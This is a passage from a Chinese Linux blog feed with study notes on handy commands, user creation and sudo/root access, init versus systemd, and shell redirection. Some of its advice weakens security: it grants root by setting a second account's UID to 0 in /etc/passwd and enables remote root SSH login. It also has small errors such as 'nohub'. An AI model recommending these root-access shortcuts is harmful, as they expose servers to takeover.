class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hisotry</span><br><span class="line">8874  pstree | grep nginx</span><br><span class="line">$  date</span><br><span class="line">2020年 5月18日 星期一 21时09分03秒 CST</span><br><span class="line">$ history</span><br><span class="line">8874  pstree | grep nginx</span><br></pre></td></tr></table></figure><h3 id="一些其他命令"><a href="#一些其他命令" class="headerlink" title="一些其他命令"></a>一些其他命令</h3><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><p>查找发行版信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><p>查看当前日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br></pre></td></tr></table></figure><p>立即关机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ shutdown -h now</span><br></pre></td></tr></table></figure><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><p>输出文件类型信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file test.txt</span><br><span class="line">test.txt: ASCII text</span><br></pre></td></tr></table></figure><p>在终端中进行简单的算数运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ expr 1 + 3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>重命名文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mv fileA.txt fileB.txt</span><br><span class="line">$ ls</span><br><span class="line">fileB.txt</span><br></pre></td></tr></table></figure><p>nohup 是一个 <code>POSIX</code> 命令，用于忽略 <code>SIGHUP</code> 。 SIGHUP信号是終端注销时所发送至程序的一个信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohub php script.php</span><br></pre></td></tr></table></figure><p>type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type -a php</span><br><span class="line">php is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</span><br><span class="line">php is &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>命令类型：</p><ul><li>alias：别名。</li><li>keyword：关键字，Shell保留字。</li><li>function：函数，Shell函数。</li><li>builtin：内建命令，Shell内建命令。</li><li>file：文件，磁盘文件，外部命令。</li><li>unfound：没有找到。</li></ul><p>查找进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep php</span><br></pre></td></tr></table></figure><p>注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用<code>-aux</code>参数，但可能其他系统不能加破折号。<br>参考链接：<a href="https://www.computerhope.com/unix/ups.htm" target="_blank" rel="noopener">Linux ps command help and example</a></p><p>杀死进程</p><ol><li>根据 <code>pid</code>（会杀死指定pid 的进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 [pid]</span><br></pre></td></tr></table></figure><ol start="2"><li>根据进程名称（会杀死一组同名进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall php</span><br></pre></td></tr></table></figure><h3 id="全局根据文件名查找文件具体路径"><a href="#全局根据文件名查找文件具体路径" class="headerlink" title="全局根据文件名查找文件具体路径"></a>全局根据文件名查找文件具体路径</h3><p>有时候很想找到某个文件，但是又不记得具体路径了，这时可以使用 <code>find</code> 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &lt;file name&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/zhu_xun/article/details/17018799" target="_blank" rel="noopener">鲜为人知而又实用的 Linux 命令</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 添加用户以及权限分配</title>
    <link href="https://www.0x2beace.com/linux-add-users-and-assign-permissions/"/>
    <id>https://www.0x2beace.com/linux-add-users-and-assign-permissions/</id>
    <published>2020-07-15T15:19:14.000Z</published>
    <updated>2020-07-16T15:29:23.772Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。</p><p>另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>在 Linux 上，添加用户有两种方式：<code>useradd</code>和<code>adduser</code>，其区别就是：</p><ul><li>useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。</li><li>adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。</li></ul><h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><p>相比 useradd，adduser的使用要简单很多。</p><p>使用adduser 添加一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser boo</span><br></pre></td></tr></table></figure><p>然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 <code>/home</code> 目录下创建一个与用户同名的目录。</p><p>用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。</p><h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p>useradd 命令有大量的参数供我们进行个性设置，常用参数如下：</p><ul><li>-d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权</li><li>-g&lt;群组&gt;：指定用户所属的群组；</li><li>-G&lt;群组&gt;：指定用户所属的附加群组；</li><li>-m：在 /home 目录下自动建立用户的登入目录；</li><li>-r：建立系统帐号；</li><li>-s<shell>：指定用户登入后所使用的shell；</li><li>-u<uid>：指定用户的 id</li></ul><p>使用 useradd 创建用户的一般步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ useradd -m boo -s &#x2F;bin&#x2F;bash</span><br><span class="line">$ passwd boo</span><br><span class="line">$ ls &#x2F;home&#x2F;</span><br><span class="line">boo</span><br></pre></td></tr></table></figure><p>其中要注意的有：</p><ol><li>useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。</li><li>useradd <del>这个命令创建的是普通账号，并不能用来登录系统</del>。加上参数<code>-r</code>，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。</li><li>当使用参数<code>-m</code>的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用<code>-m</code>的话，那么就默认是使用<code>-M</code>参数，不创建主文件夹，即使你使用了<code>-d</code>这个参数。所以如果想要自己选择主文件夹，需要同时加上<code>-m</code>和<code>-d</code>参数。</li><li>误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。</li></ol><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>不出意外，你肯定会得到这样一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[sudo] password for boo:</span><br><span class="line">boo is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？</p><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL&#x3D;(ALL) ALL</span><br><span class="line"></span><br><span class="line"># 找到该注释，在其下增加一行 </span><br><span class="line">%yourusername ALL&#x3D;(ALL) ALL</span><br></pre></td></tr></table></figure><p>然后保存退出，就会发现可以使用 sudo 提权了。</p><h3 id="赋予-root-权限"><a href="#赋予-root-权限" class="headerlink" title="赋予 root 权限"></a>赋予 root 权限</h3><p>这里有三种方式，先来看看最简单的方式：</p><p>方式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 将用户id 改为 0</span><br><span class="line">testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>该方法适用于普通用户以及管理员用户</li><li>使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。</li></ol><p>方式二：（这里以ubuntu 系统为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">#  Allow members of group sudo to execute any command</span><br><span class="line">%sudo   ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># 在其后面增加一行</span><br><span class="line">%wheel ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>然后修改该用户，使其属于 root 组（wheel）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -g root boo</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式三：（这里以ubuntu 为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。</p><p>另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 <del>远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。</del></p><p>事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 <code>Permission denied, please try again.</code>这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。</p><h3 id="扩展补充"><a href="#扩展补充" class="headerlink" title="扩展补充"></a>扩展补充</h3><h4 id="在Ubuntu中如何修改-root-密码"><a href="#在Ubuntu中如何修改-root-密码" class="headerlink" title="在Ubuntu中如何修改 root 密码"></a>在Ubuntu中如何修改 root 密码</h4><p>默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如<code>su -</code>之类的命令成为超级用户。</p><p>但可以借助其他方式，使用<code>passwd</code>命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。</p><p>使用以下命令成为 root用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i</span><br><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><p>如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><h4 id="在Ubuntu中如何远程-root-登入"><a href="#在Ubuntu中如何远程-root-登入" class="headerlink" title="在Ubuntu中如何远程 root 登入"></a>在Ubuntu中如何远程 root 登入</h4><p>在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># PermitRootLogin prohibit-password</span><br><span class="line"># 修改为：</span><br><span class="line"># PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"># 重启sshd 服务</span><br><span class="line">$ sudo systemctl restart sshd</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/li_101357/article/details/46778827" target="_blank" rel="noopener">adduser 和 useradd 的区别</a></li><li><a href="https://www.cnblogs.com/noway-neway/p/5235300.html" target="_blank" rel="noopener">Ubuntu 如何进入单用户模式</a></li><li><a href="https://raspberrypi.stackexchange.com/questions/48056/how-to-login-as-root-remotely" target="_blank" rel="noopener">ssh-如何远程以root 登入</a></li><li><a href="https://www.cyberciti.biz/faq/change-root-password-ubuntu-linux/" target="_blank" rel="noopener">如何在Ubuntu Linux 中更改 root 密码</a></li><li><a href="https://www.cyberciti.biz/faq/become-superuser-on-ubuntu-linux/" target="_blank" rel="noopener">如何使用su / sudo成为Ubuntu Linux的超级用户？</a></li><li><a href="https://www.cyberciti.biz/faq/ubuntu-linux-root-password-default-password/" target="_blank" rel="noopener">Ubuntu Linux root 用户默认密码</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。&lt;/p&gt;
&lt;p&gt;另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux init、service、systemctl 三者区别</title>
    <link href="https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/"/>
    <id>https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/</id>
    <published>2020-07-14T15:38:00.000Z</published>
    <updated>2020-12-12T05:46:24.839Z</updated>
    
    <content type="html"><![CDATA[<p>在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是<code>init</code>、<code>service</code>、<code>systemctl</code>。</p><p>至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。</p><a id="more"></a><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>历史上，Linux 的启动一直采用init 进程。</p><p>在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。</p><p>Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。</p><p>因为init 的参数全在<code>/etc/init.d</code>目录下，所以使用 init 启动一个服务，应该这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br></pre></td></tr></table></figure><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>通过查看man 手册页可以得知，service是一个运行<code>System V init</code>的脚本命令。</p><blockquote><p>那么什么是 System V init 呢？</p></blockquote><p>也就是<code>/etc/init.d</code> 目录下的参数。</p><p>所以分析可知service 是去<code>/etc/init.d</code>目录下执行相关程序，服务配置文件的存放目录就是<code>/etc/init.d</code>.</p><p>使用 service 启动一个服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>可以理解成 service 就是<code>init.d</code> 的一种实现方式。<br>所以这两者启动方式（或者是停止、重启）并没有什么区别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br><span class="line">&#x2F;&#x2F; 等价于</span><br><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>但是这两种方式均有如下缺点：</p><ol><li>启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</li><li>启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</li></ol><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>Systemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。<br>Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 <code>System V init</code>固有的缺点，提高系统的启动速度。</p><p>根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。</p><p>使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。</p><p>查看Systemd 的版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl --version</span><br></pre></td></tr></table></figure><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p><strong>Systemd 并不是一个命令，而是一组命令</strong>，涉及到系统管理的方方面面。</p><h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><p>systemctl是 Systemd 的主命令，用于管理系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动进入救援状态（单用户状态）</span><br><span class="line">$ sudo systemctl rescue</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 管理服务</span><br><span class="line">$ sudo systemctl start nginx</span><br></pre></td></tr></table></figure><h4 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h4><p>hostnamectl命令用于查看当前主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 显示当前主机信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname BoodeUbuntu</span><br></pre></td></tr></table></figure><h4 id="localectl"><a href="#localectl" class="headerlink" title="localectl"></a>localectl</h4><p>localectl命令用于查看本地化设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看本地化设置</span><br><span class="line">$ localectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置本地化参数。</span><br><span class="line">$ sudo localectl set-locale LANG&#x3D;en_GB.utf8</span><br><span class="line">$ sudo localectl set-keymap en_GB</span><br></pre></td></tr></table></figure><h4 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h4><p>timedatectl命令用于查看当前时区设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看当前时区设置</span><br><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 显示所有可用的时区</span><br><span class="line">$ timedatectl list-timezones                                                                                   </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置当前时区</span><br><span class="line">$ sudo timedatectl set-timezone America&#x2F;New_York</span><br><span class="line">$ sudo timedatectl set-time YYYY-MM-DD</span><br><span class="line">$ sudo timedatectl set-time HH:MM:SS</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>init</code> 是最初的进程管理方式</li><li><code>service</code> 是<code>init</code> 的另一种实现</li><li><code>systemd</code> 则是一种取代 <code>initd</code> 的解决方案</li></ul><p>其中 <code>systemctl</code> 是 <code>systemd</code> 的主命令，用于管理系统以及服务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener">Linux Init - 维基百科</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程 - 阮一峰的网络日志</a></li><li><a href="https://blog.csdn.net/lineuman/article/details/52578399" target="_blank" rel="noopener">init、service、systemctl 的区别</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html" target="_blank" rel="noopener">Linux 守护进程的启动方式</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是&lt;code&gt;init&lt;/code&gt;、&lt;code&gt;service&lt;/code&gt;、&lt;code&gt;systemctl&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>了解 Linux的管道符、重定向、环境变量</title>
    <link href="https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/"/>
    <id>https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/</id>
    <published>2020-07-13T15:48:12.000Z</published>
    <updated>2020-07-14T15:49:18.916Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。</p><a id="more"></a><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><p>在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别：</p><ul><li>标准输出信息：<br>包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。</li><li>错误输出信息：<br>Bash终端显示的报错提示信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls</span><br><span class="line">testdir   test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!                        # 标准输出信息</span><br><span class="line">[max@localhost 桌面]$ cat xxx</span><br><span class="line">cat: xxx: 没有那个文件或目录        # 错误输出信息 因为不存在xxx文件</span><br></pre></td></tr></table></figure></li><li>标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。</li><li>标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。</li><li>错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。</li></ul><p>之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令 &gt; 文件        将标准输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 2&gt; 文件    将错误输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 &gt;&gt; 文件    将标准输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 2&gt;&gt; 文件   将错误输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 &gt;&gt; 文件 2&gt;&amp;1 或</span><br><span class="line">命令 &amp;&gt;&gt; 文件将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!</span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt </span><br><span class="line">Hello Linux!</span><br><span class="line">测试输出重定向(追加模式)</span><br><span class="line"></span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">测试输出重定向(清除模式)</span><br></pre></td></tr></table></figure><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件将文件作为命令的标准输入</span><br><span class="line">命令 &lt;&lt; 分界符从标准输入中读入，直到遇见分界符才停止</span><br><span class="line">命令 &lt; 文件1 &gt; 文件2将文件1作为命令的标准输入并将标准输出到文件2</span><br></pre></td></tr></table></figure><p>输入重定向相对于输出重定向较使用的少一些，可以理解为：<strong>输入重定向的作用是把文件直接导入到命令中</strong>。<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。</span><br><span 